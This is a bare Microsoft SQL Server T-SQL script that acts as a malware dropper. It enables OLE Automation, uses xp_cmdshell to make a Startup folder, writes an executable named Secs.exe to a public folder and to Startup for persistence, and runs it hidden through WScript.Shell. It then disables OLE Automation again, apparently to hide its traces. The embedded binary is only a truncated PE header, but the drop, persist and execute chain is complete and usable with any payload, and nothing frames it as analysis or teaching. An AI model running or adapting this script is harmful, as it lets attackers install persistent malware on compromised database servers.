DECLARE @DATA VARBINARY(MAX) = 0x4D5A90000300000004000000FFFF0000B800000000000000;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
EXEC master..xp_cmdshell N'mkdir "C:\users\public\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul';
DECLARE @t INT;
EXEC sp_OACreate 'ADODB.Stream', @t OUT;
EXEC sp_OASetProperty @t, 'Type', 1;
EXEC sp_OAMethod @t, 'Open';
EXEC sp_OAMethod @t, 'Write', NULL, @DATA;
EXEC sp_OAMethod @t, 'SaveToFile', NULL, 'C:\users\public\Secs.exe', 2;
EXEC sp_OAMethod @t, 'SaveToFile', NULL, 'C:\users\public\Microsoft\Windows\Start Menu\Programs\Startup\Secs.exe', 2;
EXEC sp_OAMethod @t, 'Close';
EXEC sp_OADestroy @t;
DECLARE @sh INT, @ret INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUT;
EXEC sp_OAMethod @sh, 'Run', @ret OUT, 'C:\users\public\Secs.exe', 0, 0;
EXEC sp_OADestroy @sh;
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
GO
